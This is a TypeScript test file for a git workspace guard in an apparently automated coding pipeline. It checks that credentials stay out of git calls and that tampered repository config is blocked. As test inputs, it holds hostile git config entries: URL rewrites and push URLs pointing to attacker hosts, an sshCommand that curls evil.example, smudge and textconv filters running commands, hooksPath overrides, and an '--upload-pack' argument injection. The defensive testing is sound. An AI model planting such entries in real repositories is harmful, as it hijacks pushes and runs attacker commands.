import { afterEach, expect, test } from "bun:test";
import { appendFile, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CriteriaBook } from "../src/criteria.ts";
import { SqliteStore } from "../src/db/store.ts";
import { GIT_SAFE, ghEnv, gitDeliverAuthArgs } from "../src/env.ts";
import { Pipeline } from "../src/pipeline.ts";
import {
  gitWorkspace,
  initDeliveryRepo,
  inspectGitConfig,
  inspectRepoGitConfig,
  repoGitConfigPath,
} from "../src/ports/git.ts";
import { githubForge } from "../src/ports/github.ts";
import { runCommand } from "../src/runner.ts";
import type { Exec } from "../src/types.ts";
import {
  CHECKED,
  config,
  done,
  FakeSessions,
  FakeTracker,
  issue,
  PASS,
  readyDescription,
} from "./helpers.ts";

const temps: string[] = [];
afterEach(async () => {
  while (temps.length > 0) {
    await rm(temps.pop() as string, { recursive: true, force: true });
  }
});

const tempDir = async (prefix: string) => {
  const dir = await mkdtemp(join(tmpdir(), prefix));
  temps.push(dir);
  return dir;
};

const baseGitEnv = (): Record<string, string> => ({
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  GIT_CONFIG_NOSYSTEM: "1",
});

const makeRealGitRepo = async (root: string, remoteUrl: string) => {
  await mkdir(root, { recursive: true });
  const env = baseGitEnv();
  const git = (args: string[]) =>
    runCommand(["git", ...args], { cwd: root, env, timeoutMs: 15_000 });
  expect((await git(["init", "-b", "main"])).code).toBe(0);
  expect((await git(["config", "user.name", "Test"])).code).toBe(0);
  expect((await git(["config", "user.email", "test@example.com"])).code).toBe(0);
  expect((await git(["remote", "add", "origin", remoteUrl])).code).toBe(0);
  await writeFile(join(root, "a.txt"), "hello\n");
  expect((await git(["add", "a.txt"])).code).toBe(0);
  expect((await git(["commit", "-m", "init"])).code).toBe(0);
};

test("inspectGitConfig rejects include, includeIf, insteadOf, pushurl, sshCommand, and parser bypass syntaxes", () => {
  expect(
    inspectGitConfig(
      '[core]\n\tbare = false\n[remote "origin"]\n\turl = https://github.com/o/r.git\n',
    ).ok,
  ).toBe(true);
  for (const bad of [
    "[include]\n\tpath = /tmp/evil\n",
    '[includeIf "gitdir:/"]\n\tpath = /tmp/evil\n',
    '[url "https://evil.example/"]\n\tinsteadOf = https://github.com/\n',
    '[remote "origin"]\n\tpushurl = https://evil.example/r.git\n',
    "[core]\n\tsshCommand = curl https://evil.example\n",
    // Same-line `[section] key = value`, chained headers, legacy `[section.sub]`, `#`/`\"` inside quotes, malformed header, NUL byte.
    "[include] path = /tmp/evil\n",
    "[core] [include] path = /tmp/evil\n",
    '[core] [url "https://evil.example/"] insteadOf = https://github.com/\n',
    "[core] sshCommand = id\n",
    '[url "https://evil.example/"] insteadOf = https://github.com/\n',
    '[remote "origin"] pushurl = https://evil.example/r.git\n',
    "[filter.evil]\n\tsmudge = id\n",
    '[includeIf "gitdir:/tmp#x"]\n\tpath = /tmp/evil\n',
    '[filter "a#b"]\n\tsmudge = id\n',
    '[filter "a\\"b"]\n\tsmudge = id\n',
    "[diff]\n\texternal = /tmp/evil-diff\n",
    '[diff "driver"]\n\ttextconv = id\n',
    '[diff "driver"]\n\tcommand = /tmp/evil-diff\n',
    '[branch "autosetupmerge\0x"]\n\trebase = false\n',
    "[unclosed\n\tfoo = bar\n",
  ]) {
    expect(inspectGitConfig(bad).ok).toBe(false);
  }
});

test("when a worktree tampers with shared .git/config, loop runs zero credentialed git and blocks the run (CYC-478)", async () => {
  const base = await tempDir("loop-git-safety-");
  const repoRoot = join(base, "repo");
  const stateDir = join(base, "state");
  const upstream = join(base, "upstream.git");
  await runCommand(["git", "init", "--bare", upstream], {
    cwd: base,
    env: baseGitEnv(),
    timeoutMs: 15_000,
  });
  await makeRealGitRepo(repoRoot, upstream);

  const cfgPath = repoGitConfigPath(repoRoot) as string;
  const inspected = inspectRepoGitConfig(await readFile(cfgPath, "utf8"));
  expect(inspected.ok).toBe(true);
  const deliveryRepo = await initDeliveryRepo(stateDir, upstream, runCommand, process.env);

  const notices: string[] = [];
  const recorded: { argv: string[]; env: Record<string, string>; cwd: string }[] = [];
  const spyExec: Exec = async (argv, opts) => {
    recorded.push({ argv, env: opts.env, cwd: opts.cwd });
    // Fake verify commands succeed without running real checks.
    if (argv[0] === "bun") return { code: 0, output: " 1 pass\n 0 fail\n", timedOut: false };
    return runCommand(argv, opts);
  };

  const ws = gitWorkspace({
    exec: spyExec,
    env: {
      PATH: process.env.PATH,
      GH_TOKEN: "ghp_supersecret12345678901234567890123456",
      HOME: "/real/home",
    },
    repoRoot,
    remote: "origin",
    stateDir,
    delivery: {
      repo: deliveryRepo,
      repoConfigHash: inspected.ok ? inspected.hash : "",
      onTamper: (reason) => notices.push(reason),
    },
  });

  // Simulate an adversarial test/session tampering with shared `.git/config`.
  await appendFile(
    cfgPath,
    '\n[url "https://attacker.invalid/"]\n\tinsteadOf = https://github.com/\n',
  );

  const pushRes = await ws.push({ cwd: repoRoot, timeoutMs: 10_000 }, "auto/cyc-1");
  expect(pushRes.code).toBe(1);
  expect(pushRes.output).toContain("仓库配置被改动，未推送");
  expect(notices.length).toBe(1);

  // Zero git commands were invoked with any credentials after tampering.
  const credentialedGit = recorded.filter(
    (c) =>
      c.argv[0] === "git" && (c.env.GH_TOKEN !== undefined || c.env.SSH_AUTH_SOCK !== undefined),
  );
  expect(credentialedGit).toEqual([]);

  // End-to-end inside Pipeline: deliver checks configClean and blocks the run with notice.
  const store = SqliteStore.open(stateDir, () => new Date("2026-11-27T00:00:00Z"));
  const tracker = new FakeTracker([issue({ description: readyDescription })]);
  const sessions = new FakeSessions({
    dev: [done()],
    qa: [done(`${CHECKED}${PASS}`)],
  });
  const pipeline = new Pipeline({
    config: config({ repoRoot, stateDir }),
    tracker,
    sessions,
    exec: async (argv, opts) => {
      if (argv[0] === "bun") return { code: 0, output: " 2 pass\n 0 fail\n", timedOut: false };
      if (argv[0] === "git" && argv.includes("diff") && argv.includes("--name-only"))
        return { code: 0, output: "packages/client/src/a.ts\n", timedOut: false };
      return spyExec(argv, opts);
    },
    workspace: ws,
    store,
    clock: { now: () => new Date("2026-11-27T00:00:00Z") },
    log: () => {},
    env: { PATH: process.env.PATH, GH_TOKEN: "ghp_supersecret12345678901234567890123456" },
    sleep: async () => {},
  });

  // Put the run right at delivering so configClean triggers before push.
  await store.save({
    key: "CYC-1",
    kind: "dev",
    issueId: 1,
    issueNumber: 1,
    title: "work item",
    phase: "delivering",
    round: 0,
    worktree: repoRoot,
    localBranch: "worktree-auto/cyc-1",
    remoteBranch: "auto/cyc-1",
    devSessionId: "dev-1",
    qaSessionId: "qa-1",
    replacedSessions: [],
    blockedReason: null,
    resumeFrom: null,
    findings: null,
    cleanedAt: null,
    cleanupNote: null,
    startedAt: "2026-11-27T00:00:00Z",
    updatedAt: "2026-11-27T00:00:00Z",
    dev: {
      prUrl: null,
      ciRound: 0,
      ciFailedSha: null,
      nodeModulesReleased: false,
      conflictRound: 0,
      conflict: null,
      resolvedFiles: [],
      reviewSessionId: null,
      fullFlowDocs: [],
      bodyHash: null,
      bodyChanged: false,
      activeNodeId: null,
    },
  });
  await store.saveCriteria("CYC-1", CriteriaBook.fromSpecs([]));
  const step = await pipeline.step();
  expect(step).toMatchObject({ status: "blocked", key: "CYC-1" });
  expect((await store.load("CYC-1"))?.blockedReason).toContain("仓库配置被改动，未推送");
});

test("delivery.git config tamper refuses push/fetch and emits Notice; clean delivery pushes only via delivery.git (CYC-478)", async () => {
  const base = await tempDir("loop-delivery-");
  const repoRoot = join(base, "repo");
  const stateDir = join(base, "state");
  const upstream = join(base, "upstream.git");
  await runCommand(["git", "init", "--bare", upstream], {
    cwd: base,
    env: baseGitEnv(),
    timeoutMs: 15_000,
  });
  await makeRealGitRepo(repoRoot, upstream);

  const cfgPath = repoGitConfigPath(repoRoot) as string;
  const inspected = inspectRepoGitConfig(await readFile(cfgPath, "utf8"));
  const deliveryRepo = await initDeliveryRepo(stateDir, upstream, runCommand, process.env);

  const calls: { argv: string[]; env: Record<string, string>; cwd: string }[] = [];
  const notices: string[] = [];
  const ws = gitWorkspace({
    exec: async (argv, opts) => {
      calls.push({ argv, env: opts.env, cwd: opts.cwd });
      return runCommand(argv, opts);
    },
    env: { PATH: process.env.PATH, GH_TOKEN: "ghp_secret_delivery_val", HOME: "/real/home" },
    repoRoot,
    remote: "origin",
    stateDir,
    delivery: {
      repo: deliveryRepo,
      repoConfigHash: inspected.ok ? inspected.hash : "",
      onTamper: (reason) => notices.push(reason),
    },
  });

  // Happy path push: fetches worktree locally without creds, pushes only from delivery.git with creds.
  const okPush = await ws.push({ cwd: repoRoot, timeoutMs: 15_000 }, "auto/cyc-99");
  expect(okPush.code).toBe(0);
  const fetchCall = calls.find((c) => c.argv.includes("fetch"));
  const pushCall = calls.find((c) => c.argv.includes("push"));
  expect(fetchCall?.env.GH_TOKEN).toBeUndefined();
  expect(fetchCall?.env.GIT_CONFIG_NOSYSTEM).toBe("1");
  expect(fetchCall?.env.GIT_CONFIG_GLOBAL).toBe(join(stateDir, "gitconfig"));
  expect(pushCall?.argv.slice(0, 1 + GIT_SAFE.length)).toEqual(["git", ...GIT_SAFE]);
  expect(pushCall?.argv).toContain(deliveryRepo.dir);
  expect(pushCall?.env.GH_TOKEN).toBe("ghp_secret_delivery_val");
  expect(pushCall?.argv.join(" ")).not.toContain("ghp_secret_delivery_val");

  // Push main to upstream, then verify fetchMain refreshes repoRoot's origin/main via delivery.git.
  expect((await ws.push({ cwd: repoRoot, timeoutMs: 15_000 }, "main")).code).toBe(0);
  calls.length = 0;
  const fetched = await ws.fetchMain({ cwd: repoRoot, timeoutMs: 15_000 });
  expect(fetched.code).toBe(0);
  const headSha = (
    await runCommand(["git", "rev-parse", "HEAD"], {
      cwd: repoRoot,
      env: baseGitEnv(),
      timeoutMs: 10_000,
    })
  ).output.trim();
  const originMainSha = (
    await runCommand(["git", "rev-parse", "refs/remotes/origin/main"], {
      cwd: repoRoot,
      env: baseGitEnv(),
      timeoutMs: 10_000,
    })
  ).output.trim();
  expect(originMainSha).toBe(headSha);
  // Credentialed fetch ran only against delivery.git; local repoRoot fetch had no credentials.
  const credFetches = calls.filter((c) => c.env.GH_TOKEN !== undefined);
  expect(credFetches).toHaveLength(1);
  expect(credFetches[0]?.argv).toContain(deliveryRepo.dir);
  const localFetch = calls.find((c) => c.cwd === repoRoot);
  expect(localFetch?.env.GH_TOKEN).toBeUndefined();

  // conflictProbe must also route fetch via delivery.git and run merge-tree without credentials.
  calls.length = 0;
  expect(await ws.conflictProbe({ cwd: repoRoot, timeoutMs: 15_000 }, "origin/main")).toEqual([]);
  const mergeTreeCall = calls.find((c) => c.argv.includes("merge-tree"));
  expect(mergeTreeCall?.env.GH_TOKEN).toBeUndefined();
  expect(
    calls
      .filter((c) => c.env.GH_TOKEN !== undefined)
      .every((c) => c.argv.includes(deliveryRepo.dir)),
  ).toBe(true);

  // A PR branch comes in through delivery.git with credentials; the local fetch has none.
  expect((await ws.push({ cwd: repoRoot, timeoutMs: 15_000 }, "feat/pr")).code).toBe(0);
  calls.length = 0;
  const pulled = await ws.fetchPrBranch(
    { cwd: repoRoot, timeoutMs: 15_000 },
    "feat/pr",
    "loop-pr/7",
  );
  expect(pulled.code).toBe(0);
  const localPr = (
    await runCommand(["git", "rev-parse", "refs/loop-pr/loop-pr/7"], {
      cwd: repoRoot,
      env: baseGitEnv(),
      timeoutMs: 10_000,
    })
  ).output.trim();
  expect(localPr).toBe(headSha);
  const credPr = calls.filter((c) => c.env.GH_TOKEN !== undefined);
  expect(credPr).toHaveLength(1);
  expect(credPr[0]?.argv).toContain(deliveryRepo.dir);
  expect(
    (await ws.fetchPrBranch({ cwd: repoRoot, timeoutMs: 5_000 }, "--upload-pack=x", "loop-pr/8"))
      .code,
  ).toBe(1);

  // Tamper with delivery.git/config -> refused with Notice and zero credentialed git calls.
  calls.length = 0;
  await appendFile(deliveryRepo.configPath, "\n# tampered\n");
  const blockedPr = await ws.fetchPrBranch(
    { cwd: repoRoot, timeoutMs: 5_000 },
    "feat/pr",
    "loop-pr/9",
  );
  expect(blockedPr.code).toBe(1);
  const blockedPush = await ws.push({ cwd: repoRoot, timeoutMs: 10_000 }, "auto/cyc-99");
  expect(blockedPush.code).toBe(1);
  expect(notices.some((n) => n.includes("delivery.git"))).toBe(true);
  expect(calls.filter((c) => c.env.GH_TOKEN !== undefined)).toEqual([]);
});

test("gh runs in empty <stateDir>/gh-cwd with minimal ghEnv and explicit --repo (CYC-478)", async () => {
  const stateDir = await tempDir("loop-gh-env-");
  const calls: { argv: string[]; env: Record<string, string>; cwd: string }[] = [];
  const forge = githubForge({
    exec: async (argv, opts) => {
      calls.push({ argv, env: opts.env, cwd: opts.cwd });
      return { code: 0, output: "https://github.com/OhMyJames/cycle/pull/42\n", timedOut: false };
    },
    env: {
      PATH: "/usr/bin:/bin",
      HOME: "/Users/secret",
      GH_TOKEN: "gh_tok",
      GH_HOST: "github.com",
      GITHUB_TOKEN: "should_not_pass",
      SSH_AUTH_SOCK: "/tmp/ssh.sock",
      PLAN_KEY: "should_not_pass",
    },
    repo: "OhMyJames/cycle",
    stateDir,
  });

  const bodyPath = join(stateDir, "pr.md");
  await writeFile(bodyPath, "Closes CYC-478\n");
  const created = await forge.createPr(
    { cwd: "/some/untrusted/worktree", timeoutMs: 5000 },
    { base: "main", head: "auto/cyc-478", title: "CYC-478 test", bodyPath },
  );
  expect(created).toEqual({ ok: true, url: "https://github.com/OhMyJames/cycle/pull/42" });
  expect(calls).toHaveLength(1);
  expect(calls[0]?.cwd).toBe(join(stateDir, "gh-cwd"));
  expect(calls[0]?.argv).toEqual([
    "gh",
    "pr",
    "create",
    "--base",
    "main",
    "--head",
    "auto/cyc-478",
    "--title",
    "CYC-478 test",
    "--body-file",
    bodyPath,
    "--repo",
    "OhMyJames/cycle",
  ]);
  expect(calls[0]?.env).toEqual({
    PATH: "/usr/bin:/bin",
    GH_TOKEN: "gh_tok",
    GH_HOST: "github.com",
    GH_CONFIG_DIR: join(stateDir, "gh"),
  });

  // GITHUB_TOKEN fallback when GH_TOKEN is unset, and gitDeliverAuthArgs never embeds token values in argv.
  const fallback = ghEnv({ PATH: "/usr/bin", GITHUB_TOKEN: "ghp_fallback_secret" }, stateDir);
  expect(fallback.GH_TOKEN).toBe("ghp_fallback_secret");
  const authArgs = gitDeliverAuthArgs({ GH_TOKEN: "ghp_secret_value" });
  expect(authArgs.length).toBeGreaterThan(0);
  expect(authArgs.join(" ")).toContain("credential.https://github.com.helper=");
  expect(authArgs.join(" ")).not.toContain("ghp_secret_value");
});

test("inspectRepoGitConfig ignores benign branch tracking entries but detects tampered keys inside [branch] or other sections", () => {
  const baseCfg = [
    "[core]",
    "\trepositoryformatversion = 0",
    "\tbare = false",
    '[remote "origin"]',
    "\turl = https://github.com/o/r.git",
    "\tfetch = +refs/heads/*:refs/remotes/origin/*",
    '[branch "main"]',
    "\tremote = origin",
    "\tmerge = refs/heads/main",
    "",
  ].join("\n");
  const baseline = inspectRepoGitConfig(baseCfg);
  expect(baseline.ok).toBe(true);
  if (!baseline.ok) return;

  // Adding/removing normal branch tracking sections must not drift the repo config hash.
  const withBranches = [
    baseCfg,
    '[branch "feat/other-work"]',
    "\tremote = origin",
    "\tmerge = refs/heads/feat/other-work",
    "\trebase = true",
    "\tgh-merge-base = main",
    "\tvscode-merge-base = origin/main",
    '[branch "local-track"]',
    "\tremote = .",
    "\tmerge = refs/heads/main",
    "",
  ].join("\n");
  const afterBranches = inspectRepoGitConfig(withBranches);
  expect(afterBranches).toEqual(baseline);

  // Deleting [branch "main"] or leaving an empty [branch "foo"] (git branch --unset-upstream) keeps the same hash.
  const withoutMainBranch = [
    "[core]",
    "\trepositoryformatversion = 0",
    "\tbare = false",
    '[remote "origin"]',
    "\turl = https://github.com/o/r.git",
    "\tfetch = +refs/heads/*:refs/remotes/origin/*",
    '[branch "unset-upstream"]',
    "",
  ].join("\n");
  expect(inspectRepoGitConfig(withoutMainBranch)).toEqual(baseline);

  // Tampering inside [branch "..."] or outside it MUST either fail inspection or change the hash.
  for (const tampered of [
    `${baseCfg}[branch "evil"]\n\tpushRemote = https://attacker.invalid/r.git\n`,
    `${baseCfg}[branch "evil"]\n\tremote = https://attacker.invalid/r.git\n`,
    `${baseCfg}[branch "evil"]\n\tremote = undeclared-local-dir.git\n`,
    `${baseCfg}[branch "evil"]\n\tremote = ../evil\n`,
    `${baseCfg}[branch "evil"]\n\tmerge = refs/heads/../../evil\n`,
    `${baseCfg}[branch "evil"]\n\tremote = origin \\\n\tpushRemote = evil\n`,
    `${baseCfg}[branch "evil"]\n\tunknownKey = something\n`,
    `${baseCfg}[branch "autosetupmerge\0x"]\n\trebase = false\n`,
    `${baseCfg}[branch.foo]\n\tremote = origin\n`,
    `${baseCfg}[branch "foo"] pushRemote = evil\n`,
    `${baseCfg}[branch "foo"] # comment\n\tremote = origin\n`,
    `${baseCfg}[branch]\n\tautoSetupMerge = always\n`,
    `${baseCfg}[remote "origin"]\n\turl = https://attacker.invalid/r.git\n`,
    `${baseCfg}[core]\n\thooksPath = /tmp/evil\n`,
    `${baseCfg}# injected comment\n`,
  ]) {
    const res = inspectRepoGitConfig(tampered);
    const blocked = !res.ok || res.hash !== baseline.hash;
    expect(blocked).toBe(true);
  }

  // A baseline [branch] section containing a non-benign key must still detect changes to that key.
  const withCustomBranchKey = `${baseCfg}[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n\tdescription = keep-me\n`;
  const customBase = inspectRepoGitConfig(withCustomBranchKey);
  expect(customBase.ok).toBe(true);
  const customChanged = inspectRepoGitConfig(
    `${baseCfg}[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n\tdescription = changed\n`,
  );
  expect(customChanged.ok).toBe(true);
  if (customBase.ok && customChanged.ok) {
    expect(customChanged.hash).not.toBe(customBase.hash);
  }

  // Inserting a blank line after a trailing `\` continuation changes git parsing and must change the hash.
  const contBase = inspectRepoGitConfig("[core]\n\tfoo = bar \\\n\tbaz = 1\n");
  const contBroken = inspectRepoGitConfig("[core]\n\tfoo = bar \\\n\n\tbaz = 1\n");
  expect(contBase.ok && contBroken.ok).toBe(true);
  if (contBase.ok && contBroken.ok) {
    expect(contBroken.hash).not.toBe(contBase.hash);
  }

  // A comment ending with `\` does not continue onto `[branch "main"]`.
  const commentSlashBefore = inspectRepoGitConfig(
    `${baseCfg}# note \\\n[branch "tmp"]\n\tremote = origin\n`,
  );
  const commentSlashAfter = inspectRepoGitConfig(`${baseCfg}# note \\\n`);
  expect(commentSlashBefore).toEqual(commentSlashAfter);
});

test("creating and deleting tracking branches in shared repoRoot does not block configClean or delivery push", async () => {
  const base = await tempDir("loop-shared-branch-");
  const repoRoot = join(base, "repo");
  const stateDir = join(base, "state");
  const upstream = join(base, "upstream.git");
  await runCommand(["git", "init", "--bare", upstream], {
    cwd: base,
    env: baseGitEnv(),
    timeoutMs: 15_000,
  });
  await makeRealGitRepo(repoRoot, upstream);
  // Push main to upstream and fetch so origin/main exists.
  expect(
    (
      await runCommand(["git", "push", "-u", "origin", "main"], {
        cwd: repoRoot,
        env: baseGitEnv(),
        timeoutMs: 15_000,
      })
    ).code,
  ).toBe(0);

  const cfgPath = repoGitConfigPath(repoRoot) as string;
  const inspected = inspectRepoGitConfig(await readFile(cfgPath, "utf8"));
  expect(inspected.ok).toBe(true);
  const deliveryRepo = await initDeliveryRepo(stateDir, upstream, runCommand, process.env);

  const notices: string[] = [];
  const ws = gitWorkspace({
    exec: runCommand,
    env: { PATH: process.env.PATH, HOME: "/real/home" },
    repoRoot,
    remote: "origin",
    stateDir,
    delivery: {
      repo: deliveryRepo,
      repoConfigHash: inspected.ok ? inspected.hash : "",
      onTamper: (reason) => notices.push(reason),
    },
  });

  // Simulate normal human/agent git activity modifying shared `.git/config` with `[branch "..."]` entries.
  expect(
    (
      await runCommand(["git", "checkout", "-b", "feat/concurrent-work", "origin/main"], {
        cwd: repoRoot,
        env: baseGitEnv(),
        timeoutMs: 15_000,
      })
    ).code,
  ).toBe(0);
  expect(await ws.configClean({ cwd: repoRoot, timeoutMs: 10_000 })).toEqual({ ok: true });
  expect((await ws.push({ cwd: repoRoot, timeoutMs: 15_000 }, "auto/cyc-517")).code).toBe(0);
  expect(notices).toEqual([]);

  // Deleting that tracking branch also rewrites `.git/config` and must stay clean.
  expect(
    (
      await runCommand(["git", "checkout", "main"], {
        cwd: repoRoot,
        env: baseGitEnv(),
        timeoutMs: 15_000,
      })
    ).code,
  ).toBe(0);
  expect(
    (
      await runCommand(["git", "branch", "-D", "feat/concurrent-work"], {
        cwd: repoRoot,
        env: baseGitEnv(),
        timeoutMs: 15_000,
      })
    ).code,
  ).toBe(0);
  expect(await ws.configClean({ cwd: repoRoot, timeoutMs: 10_000 })).toEqual({ ok: true });
  expect(notices).toEqual([]);

  // Adding a suspicious directive inside `[branch "..."]` must still block.
  await appendFile(cfgPath, '\n[branch "sneaky"]\n\tpushRemote = https://attacker.invalid/r.git\n');
  const blocked = await ws.configClean({ cwd: repoRoot, timeoutMs: 10_000 });
  expect(blocked.ok).toBe(false);
  expect(notices).toHaveLength(1);
});

test("workspace.diff produces a real unified diff under GIT_SAFE and ignores repo diff.external", async () => {
  const base = await tempDir("loop-diff-");
  const repoRoot = join(base, "repo");
  const stateDir = join(base, "state");
  await makeRealGitRepo(repoRoot, "https://github.com/o/r.git");

  const env = baseGitEnv();
  const git = (args: string[]) =>
    runCommand(["git", ...args], { cwd: repoRoot, env, timeoutMs: 15_000 });
  expect((await git(["checkout", "-b", "feat"])).code).toBe(0);
  await writeFile(join(repoRoot, "a.txt"), "hello\nworld\n");
  expect((await git(["add", "a.txt"])).code).toBe(0);
  expect((await git(["commit", "-m", "change a"])).code).toBe(0);

  const ws = gitWorkspace({
    exec: runCommand,
    env: { PATH: process.env.PATH, HOME: "/real/home" },
    repoRoot,
    remote: "origin",
    stateDir,
  });

  const cleanDiff = await ws.diff({ cwd: repoRoot, timeoutMs: 15_000 }, "main");
  expect(cleanDiff).toContain("diff --git a/a.txt b/a.txt");
  expect(cleanDiff).toContain("+world");
  expect(cleanDiff).not.toContain("external diff died");
  expect(await ws.changedFiles({ cwd: repoRoot, timeoutMs: 15_000 }, "main")).toEqual(["a.txt"]);

  // Even if `.git/config` defines an external diff or textconv helper, `--no-ext-diff --no-textconv` ignores them.
  const cfgPath = repoGitConfigPath(repoRoot) as string;
  await writeFile(join(repoRoot, ".gitattributes"), "*.txt diff=evil\n");
  await appendFile(
    cfgPath,
    '\n[diff]\n\texternal = /nonexistent/evil-diff\n[diff "evil"]\n\ttextconv = /nonexistent/evil-textconv\n',
  );
  const guardedDiff = await ws.diff({ cwd: repoRoot, timeoutMs: 15_000 }, "main");
  expect(guardedDiff).toContain("diff --git a/a.txt b/a.txt");
  expect(guardedDiff).toContain("+world");
  expect(guardedDiff).not.toContain("external diff died");
  expect(guardedDiff).not.toContain("evil-textconv");
});
